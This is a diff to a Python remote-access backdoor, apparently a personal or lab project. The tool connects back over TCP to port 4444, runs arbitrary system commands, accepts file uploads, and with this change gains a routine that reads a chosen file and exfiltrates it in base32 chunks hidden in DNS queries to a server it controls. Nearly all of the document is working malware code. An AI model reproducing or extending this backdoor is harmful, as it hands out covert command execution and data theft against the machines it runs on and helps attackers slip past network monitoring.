@@ -7,6 +7,9 @@ import sys
 import shutil
 import platform
 import dnslib
+import time
+import select
+
 
 class Backdoor:
     def __init__(self, ip, port, dns_server):
@@ -100,25 +103,35 @@ class Backdoor:
                 file_obj.write(base64.b64decode(content))
                 return "[+] File uploaded successfully"
         except:
-            return "[+] ERROR - Error during creating a file"           
+            return "[+] ERROR - Error during creating a file"      
+
+    def dns_udp_handle(self, data):
+        query = dnslib.DNSRecord.question(f"{data}.southpark.com")
+        dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dns_socket.setblocking(0)     
+
+        while True:
+            dns_socket.sendto(query.pack(), (self.dns_server, 53))
+            state = select.select([dns_socket], [], [], 1)
+            if state[0]:
+                response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
+                break
     
-    def send_over_dns(self, data):
-        domain_name = "southpark.com"
+    def send_over_dns(self, data, filename):
         resp = []
-        resp.append(base64.b64encode("#START#"))
-        for i in data(0, len(data), 128):
-            if i+28 > len(data) - 1:
+        resp.append(base64.b32encode(f"#FILE# {filename}".encode()))
+        for i in range(0, len(data), 64):
+            if i+64 > len(data) - 1:
                 resp.append(data[i:len(data)])
                 break
-            resp.append(data[i:i+128])
-        resp.append(base64.b64encode("#END#"))
+            resp.append(data[i:i+64])
+        resp.append(base64.b32encode("#END#".encode()))
         for chunk in resp:
-            encoded_chunk = base64.b64encode(data.encode())
-            encoded_chunk_str = str(encoded_chunk).strip("'-b")
-            query = dnslib.DNSRecord.question(encoded_chunk_str + '.' + domain_name)
-            dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            dns_socket.sendto(query.pack(), (self.dns_server, 53))
-            response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
+            encoded_chunk_str = str(chunk).strip("'b")
+            self.dns_udp_handle(encoded_chunk_str)
+            print(encoded_chunk_str)
+            time.sleep(1)
+            
     
     def recieve_over_dns(self, data):
         pass
@@ -141,18 +154,24 @@ class Backdoor:
             elif recv_data[0] == "upload":
                 res = self.write_file(recv_data[1], recv_data[2])
             elif recv_data[0] == "DNS":
+                self.sock_obj.close()
                 self.dns_run(recv_data[1:])
+                break
             else: 
                 res = self.exec_system_cmd(recv_data)
             self.reliable_send(res)
     
     def dns_run(self, recv_data):
         if recv_data[0] == "download":
-            buffer = self.read_file(recv_data[1])
-            self.send_over_dns(buffer)
+            buffer = None
+            print(recv_data)
+            with open(recv_data[1], "rb") as obj:
+                buffer = obj.read()
+            buffer = base64.b32encode(buffer)
+            self.send_over_dns(buffer, recv_data[1].split('\\')[-1])
             sys.exit(0)
         else:
-            return base64.b64encode("Unable to perform request operation")
+            return base64.b64encode("[+] Unable to perform request operation")
         '''        
         recv_data = self.send_over_dns("Active")
         while True:
@@ -165,10 +184,11 @@ class Backdoor:
                 response = self.exec_system_cmd(recv_data[0])
                 recv_data = self.send_over_dns(response)
         '''
+
 try:
-    backdoor = Backdoor("192.168.1.41",
+    backdoor = Backdoor("10.136.66.98",
                         4444,
-                        "192.168.1.41")
+                        "10.136.66.98")
     backdoor.tcp_run()
 except:
     sys.exit(0)
